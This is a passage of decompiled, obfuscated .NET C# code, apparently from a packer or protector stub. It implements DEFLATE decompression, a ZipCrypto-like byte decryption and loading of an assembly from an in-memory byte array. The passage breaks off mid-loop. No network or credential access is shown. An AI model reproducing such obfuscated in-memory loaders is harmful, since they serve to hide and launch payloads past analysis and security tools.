    static unsafe bool \u0001([In] \u0002.\u0003 obj0)
    {
      void* voidPtr;
      if (true)
      {
        // ISSUE: untyped stack allocation
        voidPtr = (void*) __untypedstackalloc(5);
        if (true)
        {
          *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, 16);
          int num1 = *(int*) voidPtr;
          int num2;
          for (int index = 0; num1 >= index; num1 = num2)
          {
            \u0008.\u0005.\u0001(obj0.\u0001, 16);
            *(int*) voidPtr = (*(int*) voidPtr << 8 | *(int*) voidPtr >> 8) & (int) ushort.MaxValue;
            if (true)
            {
              if (*(int*) voidPtr % 31 != 0)
                throw new FormatException(\u0008.\u0005.\u0082(490));
              if ((*(int*) voidPtr & 3840) != \u0008.\u0002.\u0005 << 8)
                throw new FormatException(\u0008.\u0005.\u0082(523));
            }
            num2 = *(int*) voidPtr;
            int num3 = 32;
            if (num3 == 0)
              index = num3;
            else if ((num2 & num3) != 0)
            {
              obj0.\u0001 = 1;
              if (true)
              {
                obj0.\u0003 = 32;
                goto label_13;
              }
              else
                goto label_13;
            }
            else
              goto label_10;
          }
          *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 0;
          goto label_14;
        }
        else
          goto label_13;
      }
label_10:
      obj0.\u0001 = 2;
label_13:
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) 1;
label_14:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 4);
    }

    static void \u0001([In] string obj0)
    {
      int num = (int) \u008F.\u0005\u0002((IWin32Window) null, obj0, \u0008.\u0005.\u0082(560));
    }

    static void \u0001([In] \u0002.\u0003 obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3)
    {
      if (false)
        return;
      byte[] numArray = obj1;
      int num1 = obj3;
      \u0004.\u0005 obj = obj0.\u0001;
      int num2 = obj2;
      if (true)
        goto label_6;
label_3:
      if (false)
        return;
      obj0.\u0008 += obj3;
      return;
label_6:
      \u0008.\u0005.\u0001(numArray, num1, obj, num2);
      goto label_3;
    }

    static void \u0001([In] \u0004.\u0003.\u0002 obj0, [In] int obj1)
    {
label_0:
      obj0.\u0001 >>= obj1;
      do
      {
        if (true)
          obj0.\u0003 -= obj1;
        else
          goto label_0;
      }
      while (false);
    }

    static int \u0001([In] \u0004.\u0003.\u0007 obj0) => \u0008.\u0005.\u0001(obj0) | \u0008.\u0005.\u0001(obj0) << 16;

    static unsafe void \u0001([In] byte obj0, [In] \u0002.\u0002 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      obj1.\u0001[0] = \u0008.\u0005.\u0001(obj0, obj1, obj1.\u0001[0]);
      obj1.\u0001[1] = obj1.\u0001[1] + (uint) (byte) obj1.\u0001[0];
      obj1.\u0001[1] = (uint) ((int) obj1.\u0001[1] * 134775813 + 1);
      uint[] numArray = obj1.\u0001;
      *(int*) voidPtr = (int) obj1.\u0001[2];
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) (byte) (obj1.\u0001[1] >> 24);
      int num = (int) \u0008.\u0005.\u0001(*(byte*) ((IntPtr) voidPtr + 4), obj1, *(uint*) voidPtr);
      numArray[2] = (uint) num;
    }

    static void \u0001([In] \u0004.\u0003.\u0002 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static unsafe int \u0001([In] \u0004.\u0003.\u0004 obj0, [In] \u0004.\u0003.\u0002 obj1)
    {
      int num1;
      void* voidPtr;
      if (true)
      {
        int num2 = 16;
        int index;
        int num3;
        while (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if ((index = \u0008.\u0005.\u0001(obj1, 9)) >= 0)
          {
            if ((num1 = (int) obj0.\u0001[index]) >= 0)
            {
              if (true)
              {
                \u0008.\u0005.\u0001(obj1, num1 & 15);
                num3 = num1;
                if (false)
                  num2 = num3;
                else
                  break;
              }
              else
                goto label_8;
            }
            else
              goto label_5;
          }
          else
            goto label_13;
        }
        return num3 >> 4;
label_5:
        *(int*) voidPtr = -(num1 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
        int num4;
        if ((num4 = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num5 = (int) obj0.\u0001[*(int*) voidPtr | num4 >> 9];
          \u0008.\u0005.\u0001(obj1, num5 & 15);
          return num5 >> 4;
        }
        *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0003;
        index = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
        num1 = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
label_8:
        if (true)
        {
          if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
            return -1;
          \u0008.\u0005.\u0001(obj1, num1 & 15);
          if (true)
            return num1 >> 4;
          goto label_14;
        }
        else
          goto label_16;
label_13:
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0003;
        index = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
label_14:
        num1 = (int) obj0.\u0001[index];
      }
      if (num1 < 0)
        goto label_18;
label_16:
      if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
      {
        \u0008.\u0005.\u0001(obj1, num1 & 15);
        return num1 >> 4;
      }
label_18:
      return -1;
    }

    static void \u0001([In] \u0002.\u0002 obj0)
    {
      obj0.\u0001 = obj0.\u0001.Read(obj0.\u0001, 0, obj0.\u0001.Length);
      if (obj0.\u0003 != null)
        goto label_4;
label_1:
      if (obj0.\u0001 <= 0)
        throw new ApplicationException(\u0008.\u0005.\u0082(569));
      \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001, 0, obj0.\u0001);
      return;
label_4:
      byte[] numArray = obj0.\u0001;
      \u0008.\u0005.\u0001(obj0.\u0001.Length, obj0, numArray, 0);
      goto label_1;
    }

    static void \u0001([In] int obj0, [In] byte[] obj1, [In] \u0004.\u0003.\u0002 obj2, [In] int obj3)
    {
      if (true)
        goto label_6;
label_4:
      obj2.\u0003 += 8;
label_5:
      obj2.\u0001 = obj1;
      obj2.\u0001 = obj0;
      int num;
      obj2.\u0002 = num;
      return;
label_6:
      if (obj2.\u0001 < obj2.\u0002)
        throw new InvalidOperationException();
      num = obj0 + obj3;
      if (0 > obj0 || obj0 > num || num > obj1.Length)
        throw new ArgumentOutOfRangeException();
      if ((obj3 & 1) != 0)
      {
        obj2.\u0001 |= (uint) (((int) obj1[obj0++] & (int) byte.MaxValue) << obj2.\u0003);
        goto label_4;
      }
      else
        goto label_5;
    }

    static void \u0001([In] \u000E obj0, [In] \u0008.\u0003 obj1) => obj0.\u0001 = obj1;

    static void \u0001([In] \u0008.\u0002 obj0)
    {
      obj0.\u0016 = obj0.\u0001 ? \u0008.\u0002.\u0010 : \u0008.\u0002.\u000E;
      obj0.\u0017 = 0;
      \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001);
      \u0008.\u0005.\u0001(obj0.\u0001);
    }

    static bool \u0001([In] \u0004.\u0003.\u0002 obj0) => obj0.\u0001 == obj0.\u0002;

    static unsafe int \u0001([In] \u0008.\u0004 obj0, [In] \u0004.\u0005 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      int index1;
      if ((index1 = \u0008.\u0005.\u0001(obj1, 9)) < 0)
      {
        *(int*) ((IntPtr) voidPtr + 12) = \u0008.\u0005.\u0001(obj1);
        int index2 = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
        int num = (int) obj0.\u0001[index2];
        if (num >= 0 && (num & 15) <= *(int*) ((IntPtr) voidPtr + 12))
        {
          \u0008.\u0005.\u0001(obj1, num & 15);
          *(int*) ((IntPtr) voidPtr + 16) = num >> 4;
        }
        else
          *(int*) ((IntPtr) voidPtr + 16) = -1;
      }
      else
        goto label_12;
label_11:
      return *(int*) ((IntPtr) voidPtr + 16);
label_12:
      int num1 = (int) obj0.\u0001[index1];
      if (true)
        goto label_13;
label_1:
      int num2;
      if (num1 < 0)
      {
        *(int*) voidPtr = -(num2 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num2 & 15;
        int num3;
        if ((num3 = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num4 = (int) obj0.\u0001[*(int*) voidPtr | num3 >> 9];
          \u0008.\u0005.\u0001(obj1, num4 & 15);
          *(int*) ((IntPtr) voidPtr + 16) = num4 >> 4;
          goto label_11;
        }
        else
        {
          *(int*) ((IntPtr) voidPtr + 8) = \u0008.\u0005.\u0001(obj1);
          int num5 = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
          int num6 = (int) obj0.\u0001[*(int*) voidPtr | num5 >> 9];
          if ((num6 & 15) <= *(int*) ((IntPtr) voidPtr + 8))
          {
            \u0008.\u0005.\u0001(obj1, num6 & 15);
            *(int*) ((IntPtr) voidPtr + 16) = num6 >> 4;
            goto label_11;
          }
          else
          {
            *(int*) ((IntPtr) voidPtr + 16) = -1;
            goto label_11;
          }
        }
      }
      else
      {
        \u0004.\u0005 obj = obj1;
        int num7 = num2 & 15;
        if (true)
          goto label_15;
label_2:
        *(int*) ((IntPtr) voidPtr + 16) = num2 >> 4;
        goto label_11;
label_15:
        \u0008.\u0005.\u0001(obj, num7);
        goto label_2;
      }
label_13:
      num2 = num1;
      goto label_1;
    }

    static unsafe void \u0001([In] \u0001.\u0004 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(20);
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj0.\u000E)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj0.\u0002[*(int*) voidPtr] & (int) byte.MaxValue;
        int num1 = (int) obj0.\u0001[*(int*) voidPtr];
        int num2 = num1 - 1;
        if (num1 != 0)
        {
          *(int*) ((IntPtr) voidPtr + 8) = \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 4), obj0);
          \u0008.\u0005.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 8));
          *(int*) ((IntPtr) voidPtr + 12) = (*(int*) ((IntPtr) voidPtr + 8) - 261) / 4;
          if (*(int*) ((IntPtr) voidPtr + 12) > 0 && *(int*) ((IntPtr) voidPtr + 12) <= 5)
            \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4) & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
          *(int*) ((IntPtr) voidPtr + 16) = \u0008.\u0005.\u0001(obj0, num2);
          \u0008.\u0005.\u0001(obj0.\u0002, *(int*) ((IntPtr) voidPtr + 16));
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 16) / 2 - 1;
          if (*(int*) ((IntPtr) voidPtr + 12) > 0)
            \u0008.\u0005.\u0001((\u0004.\u0006) obj0.\u0001, num2 & (1 << *(int*) ((IntPtr) voidPtr + 12)) - 1, *(int*) ((IntPtr) voidPtr + 12));
        }
        else
          \u0008.\u0005.\u0001(obj0.\u0001, *(int*) ((IntPtr) voidPtr + 4));
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      \u0008.\u0005.\u0001(obj0.\u0001, \u0001.\u0004.\u0008);
    }

    static unsafe bool \u0001([In] \u0004.\u0003.\u0001 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1 = \u0008.\u0005.\u0001(obj0.\u0001);
      while (true)
      {
        int index1;
        while (num1 >= 258)
        {
          *(int*) ((IntPtr) voidPtr + 8) = obj0.\u0001;
          switch (*(int*) ((IntPtr) voidPtr + 8))
          {
            case 7:
              int num2 = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0001);
              if (true)
              {
                index1 = num2;
                int num3;
                for (int index2 = num2 & -256; index2 == 0; index2 = num3)
                {
                  \u0008.\u0005.\u0001(obj0.\u0001, index1);
                  num3 = num1;
                  if (true)
                  {
                    if ((num1 = num3 - 1) < 258)
                      return true;
                    goto case 7;
                  }
                }
                int num4 = index1;
                num2 = 257;
                num2 = num4;
              }
              if (num2 < num2)
              {
                if (index1 < 0)
                  return false;
                obj0.\u0002 = (\u0004.\u0003.\u0004) null;
                obj0.\u0001 = (\u0004.\u0003.\u0004) null;
                obj0.\u0001 = 2;
                return true;
              }
              obj0.\u0003 = \u0004.\u0003.\u0001.\u0001[index1 - 257];
              obj0.\u0002 = \u0004.\u0003.\u0001.\u0002[index1 - 257];
              goto case 8;
            case 8:
              if (obj0.\u0002 > 0)
              {
                obj0.\u0001 = 8;
                if (true)
                {
                  *(int*) voidPtr = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0002);
                  if (*(int*) voidPtr < 0)
                    return false;
                  \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0002);
                  obj0.\u0003 += *(int*) voidPtr;
                }
                else
                  goto label_21;
              }
              obj0.\u0001 = 9;
              goto case 9;
            case 9:
              index1 = \u0008.\u0005.\u0001(obj0.\u0002, obj0.\u0001);
              goto label_20;
            case 10:
              goto label_23;
            default:
              continue;
          }
        }
        goto label_29;
label_20:
        if (index1 >= 0)
        {
          obj0.\u0004 = \u0004.\u0003.\u0001.\u0003[index1];
          obj0.\u0002 = \u0004.\u0003.\u0001.\u0004[index1];
        }
        else
          break;
label_23:
        if (obj0.\u0002 > 0)
        {
          obj0.\u0001 = 10;
          *(int*) ((IntPtr) voidPtr + 4) = \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0002);
          if (*(int*) ((IntPtr) voidPtr + 4) >= 0)
          {
            \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0002);
            obj0.\u0004 += *(int*) ((IntPtr) voidPtr + 4);
          }
          else
            goto label_25;
        }
        \u0008.\u0005.\u0001(obj0.\u0001, obj0.\u0003, obj0.\u0004);
        num1 -= obj0.\u0003;
        obj0.\u0001 = 7;
        continue;
label_29:
        if (false)
          goto label_20;
        else
          goto label_30;
      }
label_21:
      return false;
label_25:
      return false;
label_30:
      return true;
    }

    static bool \u0001([In] \u0002.\u0003 obj0)
    {
      bool flag;
      if (true)
      {
        int num1 = obj0.\u0001;
        int num2;
        if (true)
          num2 = 1;
        else
          goto label_5;
label_2:
        int num3;
        if (num1 != num2)
        {
          num3 = 0;
          goto label_10;
        }
        else
          num1 = obj0.\u0003;
label_3:
        num2 = 0;
        if (num2 == 0)
          num1 = num1 == num2 ? 1 : 0;
        else
          goto label_2;
label_5:
        if (true)
          num3 = num1;
        else
          goto label_3;
label_10:
        flag = num3 != 0;
      }
      return flag;
    }

    static void \u0001([In] int obj0, [In] int obj1, [In] byte[] obj2, [In] \u0004.\u0006 obj3)
    {
      if (true)
      {
        if (false)
          return;
        Array.Copy((Array) obj2, obj0, (Array) obj3.\u0001, obj3.\u0002, obj1);
      }
      obj3.\u0002 += obj1;
    }

    static bool \u0001([In] \u0002.\u0003 obj0) => \u0008.\u0005.\u0001(obj0.\u0001);

    static unsafe bool \u0001([In] \u0001.\u0005 obj0, [In] \u0004.\u0005 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(9);
label_43:
      while (true)
      {
        int num1;
        int num2;
        int num3;
        switch (obj0.\u0001)
        {
          case 0:
            obj0.\u0002 = \u0008.\u0005.\u0001(obj1, 5);
            if (obj0.\u0002 >= 0)
            {
              obj0.\u0002 += 257;
              \u0008.\u0005.\u0001(obj1, 5);
              obj0.\u0001 = 1;
              goto case 1;
            }
            else
              goto label_45;
          case 1:
            obj0.\u0003 = \u0008.\u0005.\u0001(obj1, 5);
            num2 = obj0.\u0003;
            num3 = 0;
            break;
          case 2:
label_6:
            obj0.\u0004 = \u0008.\u0005.\u0001(obj1, 4);
            if (obj0.\u0004 < 0)
            {
              if (false)
                goto label_16;
              else
                goto label_8;
            }
            else
            {
              obj0.\u0004 += 4;
              \u0008.\u0005.\u0001(obj1, 4);
              if (true)
              {
                obj0.\u0001 = new byte[19];
                obj0.\u0007 = 0;
                obj0.\u0001 = 3;
                goto case 3;
              }
              else
                goto label_16;
            }
          case 3:
            if (false)
              goto label_31;
            else
              goto label_16;
          case 4:
label_22:
            while (((num1 = \u0008.\u0005.\u0001(obj0.\u0001, obj1)) & -16) == 0)
            {
              if (true)
              {
                obj0.\u0002[obj0.\u0007++] = obj0.\u0001 = (byte) num1;
                if (obj0.\u0007 == obj0.\u0005)
                {
                  *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
                  goto label_42;
                }
              }
              else
                goto label_43;
            }
            int num4 = num1;
            int num5 = 0;
            if (num5 != 0)
            {
              num3 = num5;
              num2 = num4;
              break;
            }
            if (num4 >= num5)
            {
              if (num1 >= 17)
              {
                if (true)
                {
                  obj0.\u0001 = (byte) 0;
                  goto label_31;
                }
                else
                  goto label_42;
              }
              else if (obj0.\u0007 != 0)
                goto label_31;
              else
                goto label_30;
            }
            else
              goto label_25;
          case 5:
label_33:
            *(int*) ((IntPtr) voidPtr + 4) = \u0001.\u0005.\u0002[obj0.\u0006];
            int num6 = \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
            if (num6 >= 0)
            {
              \u0008.\u0005.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4));
              int num7 = num6 + \u0001.\u0005.\u0001[obj0.\u0006];
              if (obj0.\u0007 + num7 <= obj0.\u0005)
              {
                while (num7-- > 0)
                  obj0.\u0002[obj0.\u0007++] = obj0.\u0001;
                if (obj0.\u0007 != obj0.\u0005)
                {
                  obj0.\u0001 = 4;
                  continue;
                }
                goto label_40;
              }
              else
                goto label_36;
            }
            else
              goto label_34;
          default:
            continue;
        }
        if (num2 >= num3)
        {
          ++obj0.\u0003;
          \u0008.\u0005.\u0001(obj1, 5);
          obj0.\u0005 = obj0.\u0002 + obj0.\u0003;
          obj0.\u0002 = new byte[(int) checked ((uint) obj0.\u0005)];
          obj0.\u0001 = 2;
          goto label_6;
        }
        else
          break;
label_16:
        for (; obj0.\u0007 < obj0.\u0004; ++obj0.\u0007)
        {
          *(int*) voidPtr = \u0008.\u0005.\u0001(obj1, 3);
          if (*(int*) voidPtr < 0)
          {
            *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
            goto label_42;
          }
          else
          {
            \u0008.\u0005.\u0001(obj1, 3);
            obj0.\u0001[\u0001.\u0005.\u0003[obj0.\u0007]] = (byte) *(int*) voidPtr;
          }
        }
        obj0.\u0001 = new \u0008.\u0004(obj0.\u0001);
label_18:
        obj0.\u0001 = (byte[]) null;
        obj0.\u0007 = 0;
        obj0.\u0001 = 4;
        goto label_22;
label_31:
        if (true)
        {
          obj0.\u0006 = num1 - 16;
          obj0.\u0001 = 5;
          goto label_33;
        }
        else
          goto label_18;
      }
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      goto label_42;
label_8:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      goto label_42;
label_25:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      goto label_42;
label_30:
      throw new Exception();
label_34:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      goto label_42;
label_36:
      throw new Exception();
label_40:
      do
      {
        *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 1;
      }
      while (false);
label_42:
      return (bool) *(sbyte*) ((IntPtr) voidPtr + 8);
label_45:
      *(sbyte*) ((IntPtr) voidPtr + 8) = (sbyte) 0;
      goto label_42;
    }

    static Assembly \u0001([In] byte[] obj0)
    {
      Assembly assembly;
      do
      {
        MemoryStream memoryStream = (MemoryStream) null;
        assembly = (Assembly) null;
        try
        {
          memoryStream = \u0008.\u0005.\u0001(obj0);
          long num = \u008E.\u007E\u0004\u0002((object) memoryStream, 0L, SeekOrigin.Begin);
          do
          {
            assembly = \u0091.\u0007\u0002(\u0090.\u007E\u0006\u0002((object) memoryStream));
          }
          while (false);
        }
        finally
        {
          if (memoryStream != null)
            \u001B.\u007E\u0089((object) memoryStream);
          do
            ;
          while (false);
        }
      }
      while (false);
      return assembly;
    }

    static unsafe byte \u0001([In] \u0002.\u0002 obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(5);
      *(int*) voidPtr = (int) obj0.\u0001[2] & (int) ushort.MaxValue | 2;
      *(sbyte*) ((IntPtr) voidPtr + 4) = (sbyte) (byte) (*(uint*) voidPtr * (*(uint*) voidPtr ^ 1U) >> 8);
      return *(byte*) ((IntPtr) voidPtr + 4);
    }

    static int \u0001([In] \u0004.\u0003.\u0003 obj0) => obj0.\u0002;

    static void \u0001([In] \u0004.\u0005 obj0)
    {
      obj0.\u0001 >>= obj0.\u0003 & 7;
      obj0.\u0003 &= -8;
    }

    static \u0004.\u0003.\u0004 \u0001([In] \u0004.\u0003.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0002];
      Array.Copy((Array) obj0.\u0002, 0, (Array) destinationArray, 0, obj0.\u0002);
      return new \u0004.\u0003.\u0004(destinationArray);
    }

    static void \u0001([In] \u0004.\u0003.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      if ((obj0.\u0002 += obj1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = obj0.\u0001 - obj2 & (int) short.MaxValue;
      int num = 32768 - obj1;
      if (sourceIndex <= num && obj0.\u0001 < num)
      {
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
        }
        else
        {
          while (obj1-- > 0)
            obj0.\u0001[obj0.\u0001++] = obj0.\u0001[sourceIndex++];
        }
      }
      else
        \u0008.\u0005.\u0001(obj0, sourceIndex, obj1, obj2);
    }

    static void \u0001()
    {
      try
      {
        \u0003.\u0006.\u0001();
      }
      catch (Exception ex)
      {
      }
    }

    static bool \u0001([In] \u0001.\u0004 obj0)
    {
      int num1 = obj0.\u000E;
      int num2 = 16;
label_1:
      int num3;
      if (num2 != 0)
        num3 = num1 + num2;
      else
        goto label_4;
label_3:
      num2 = \u0001.\u0004.\u0001;
      num1 = num3;
label_4:
      if (true)
      {
        int num4 = num1 < num2 ? 1 : 0;
        num2 = 0;
        num1 = num4;
      }
      if (num2 == 0)
      {
        num3 = num1 == num2 ? 1 : 0;
        if (true)
          return num3 != 0;
        goto label_3;
      }
      else
        goto label_1;
    }

    static unsafe int \u0001([In] int obj0, [In] \u0004.\u0003.\u0003 obj1, [In] byte[] obj2, [In] int obj3)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
      int num1;
      int num2;
      do
      {
        *(int*) voidPtr = obj1.\u0001;
        num1 = obj0;
        num2 = obj1.\u0002;
        if (true)
        {
          if (true)
          {
            if (num1 <= num2)
              goto label_17;
            else
              goto label_16;
label_4:
            *(int*) ((IntPtr) voidPtr + 4) = obj0;
            continue;
label_16:
            obj0 = obj1.\u0002;
            goto label_4;
label_17:
            *(int*) voidPtr = obj1.\u0001 - obj1.\u0002 + obj0 & (int) short.MaxValue;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_12;
      }
      while (false);
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 8) = obj0 - *(int*) voidPtr;
        int num3 = *(int*) ((IntPtr) voidPtr + 8);
        int num4 = 0;
        if (num4 == 0)
        {
          if (num3 > num4)
            Array.Copy((Array) obj1.\u0001, 32768 - *(int*) ((IntPtr) voidPtr + 8), (Array) obj2, obj3, *(int*) ((IntPtr) voidPtr + 8));
          else
            goto label_11;
        }
        else
        {
          num2 = num4;
          num1 = num3;
          goto label_10;
        }
      }
      int num5 = obj3;
      num2 = *(int*) ((IntPtr) voidPtr + 8);
      num1 = num5;
label_10:
      obj3 = num1 + num2;
      obj0 = *(int*) voidPtr;
label_11:
      Array.Copy((Array) obj1.\u0001, *(int*) voidPtr - obj0, (Array) obj2, obj3, obj0);
      obj1.\u0002 -= *(int*) ((IntPtr) voidPtr + 4);
      int num6 = obj1.\u0002;
      num2 = 0;
      num1 = num6;
label_12:
      if (num1 < num2)
        throw new InvalidOperationException();
      return *(int*) ((IntPtr) voidPtr + 4);
    }

    static unsafe void \u0001([In] \u000E obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      \u0008.\u0005.\u0001(obj0.\u0001);
      obj0.\u0001.\u0001();
      \u000E obj1 = obj0;
      \u000E obj2 = obj0;
      int num1 = 1;
      if (true)
        goto label_8;
label_2:
      obj2.\u0005 = num1;
      int num2;
      int num3 = num2;
      obj1.\u0004 = num3;
      obj0.\u0006 = 0;
      obj0.\u0011 = 0;
      obj0.\u0001 = false;
      obj0.\u0003 = 2;
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < 32768)
      {
        obj0.\u0001[*(int*) voidPtr] = (short) 0;
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 4) = 0;
      while (*(int*) ((IntPtr) voidPtr + 4) < 32768)
      {
        obj0.\u0002[*(int*) ((IntPtr) voidPtr + 4)] = (short) 0;
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 4) + 1;
      }
      return;
label_8:
      num2 = num1;
      goto label_2;
    }

    static unsafe void \u0001([In] \u0004.\u0003.\u0004 obj0, [In] byte[] obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj1.Length)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj1[*(int*) voidPtr];
        if (*(int*) ((IntPtr) voidPtr + 4) > 0)
        {
          int[] numArray3;
          int index;
          int num = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
          numArray3[index] = num;
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 512;
      *(int*) ((IntPtr) voidPtr + 16) = 1;
      while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
        if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      obj0.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
      *(int*) ((IntPtr) voidPtr + 28) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = 15;
      if (true)
        goto label_15;
label_12:
      *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
      *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
label_13:
      if (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
      {
        obj0.\u0001[(int) \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
        goto label_12;
      }
      else
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
label_15:
      if (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
        goto label_13;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < obj1.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) obj1[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u0008.\u0005.\u0001(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
